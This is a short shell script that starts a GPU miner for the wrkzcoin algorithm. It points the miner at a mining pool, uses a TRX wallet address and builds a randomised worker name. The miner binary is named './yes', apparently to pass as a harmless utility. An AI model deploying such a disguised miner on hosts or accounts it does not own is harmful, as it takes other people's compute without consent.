POOL=rx-us.unmineable.com:3333
WALLET=TRX:TBNiCffop5JixBgS8kRnTYBqasmhfLqyze
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo L3PcNV9M-$(shuf -i 1911-596780 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
